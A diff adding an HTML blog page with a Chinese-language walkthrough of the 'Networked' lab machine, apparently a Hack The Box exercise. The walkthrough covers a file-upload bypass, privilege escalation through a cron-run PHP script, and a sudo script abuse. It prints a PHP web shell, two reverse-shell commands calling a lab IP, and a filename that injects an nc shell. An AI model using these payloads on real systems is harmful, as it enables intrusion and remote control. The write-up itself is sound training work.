@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Networked | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan  dirsearch  port 8080端口只有一段文字在源码里显示upload界面还未完成 代码审计有两个比较关键的文件一个是upload.php一个是lib.phplib.php中一共有6个函数，等会会在upload.php中被调用   第一个是检查上传的文件名称先按.切分然后将名字命名为第一部分然后把带有下划线的部分换成.然后把余下的数组进行还原返回一个name和一个用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Networked">
+<meta property="og:url" content="http://example.com/2022/08/30/Networked/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan  dirsearch  port 8080端口只有一段文字在源码里显示upload界面还未完成 代码审计有两个比较关键的文件一个是upload.php一个是lib.phplib.php中一共有6个函数，等会会在upload.php中被调用   第一个是检查上传的文件名称先按.切分然后将名字命名为第一部分然后把带有下划线的部分换成.然后把余下的数组进行还原返回一个name和一个用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/nmap.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/dirsearch.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/source.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/cmd.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/check.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/cron.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/guly.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/root1.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/sudo.png">
+<meta property="og:image" content="http://example.com/2022/08/30/Networked/root2.png">
+<meta property="article:published_time" content="2022-08-30T05:20:19.000Z">
+<meta property="article:modified_time" content="2022-08-30T08:33:12.949Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/30/Networked/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Networked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/30/Networked/" class="article-date">
+  <time class="dt-published" datetime="2022-08-30T05:20:19.000Z" itemprop="datePublished">2022-08-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Networked
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/08/30/Networked/nmap.png">
+
+<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><img src="/2022/08/30/Networked/dirsearch.png">
+
+<h4 id="port-80"><a href="#port-80" class="headerlink" title="port 80"></a>port 80</h4><p>80端口只有一段文字<br>在源码里显示upload界面还未完成<br><img src="/2022/08/30/Networked/source.png"></p>
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>有两个比较关键的文件<br>一个是upload.php<br>一个是lib.php<br>lib.php中一共有6个函数，等会会在upload.php中被调用</p>
+<ul>
+<li><ol>
+<li>第一个是检查上传的文件名称<br>先按.切分<br>然后将名字命名为第一部分<br>然后把带有下划线的部分换成.<br>然后把余下的数组进行还原<br>返回一个name和一个用点隔开各单词的字符串</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>第二个是获取上传文件名<br>内容和第一个一样</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>第三个是检查ip<br>传进来一个perfix和一个文件名<br>检查ip地址是否合法</li>
+</ol>
+</li>
+<li><ol start="4">
+<li>第四个是特定功能的过滤<br>首先是一个正则表达式<br>以a-z开始后跟一个‘-’，接a-z,0-9接‘-’<br>如果有finfo函数，就自己处理一下不返回原来应该返回的东西<br>如果有mine_content_type函数也自己处理一下</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>第五个上检查文件类型<br>用上面一个函数返回的文件类型匹配image<br>匹配成功就返回true</li>
+</ol>
+</li>
+</ul>
+<p>upload.php<br>先检查文件类型和文件大小<br>只能传jpg,png,gif,jpeg</p>
+<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>apache httpd中支持一个文件含有多个后缀，并为不同的后缀执行不同的命令<br>apache配置文件中如果添加了php对应的解析，则上传的文件只要包含.php就能执行<br>所以这里只要上传一个xxx.php.png，就能绕开过滤<br>把png文件用vim打开在中间插一句<code>&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</code><br>上传文件<br>成功上传并且能够显示命令<br>在传的文件后面跟?cmd&#x3D;id会显示出相应的信息<br><img src="/2022/08/30/Networked/cmd.png"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p><code>?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f</code><br><code>?cmd=bash+-i+%3E%26+/dev/tcp/10.10.14.3/4444+0%3E%261</code></p>
+<h4 id="guly权限"><a href="#guly权限" class="headerlink" title="guly权限"></a>guly权限</h4><p>在&#x2F;home&#x2F;guly里面有一个check_attack.php<br><img src="/2022/08/30/Networked/check.png"><br>还有一个计划任务脚本，每三分钟执行一次check_attack.php<br><img src="/2022/08/30/Networked/cron.png"><br>如果能控制$path或者$value就能实现命令注入<br>check_attack.php会检查文件但是所有不以ip开头的文件都会跳过检查<br>在uploads文件夹里新建一个<code>|nc -c bash 10.10.14.3 5555</code>文件<br>等待程序执行<br>会收到一个shell是guly权限的<br><img src="/2022/08/30/Networked/guly.png"></p>
+<h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><img src="/2022/08/30/Networked/root1.png">
+查看一下sudo列表会发现有一个sh脚本可以执行
+<img src="/2022/08/30/Networked/sudo.png">
+尝试执行这个脚本会提示执行失败，但查看时确实存在该项
+<img src="/2022/08/30/Networked/root2.png">
+当输入空格分割的词汇时，会记录空格后的命令并尝试执行，可以尝试调一下/bin/bash
+得到root权限
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/30/Networked/" data-id="cl7fxj1na0000d5cp4j2f58uz" data-title="Networked" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/08/29/Buff/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Buff</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/Networked/">Networked</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Buff/">Buff</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Arctic/">Arctic</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/28/Devel/">Devel</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/28/oscp/">oscp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
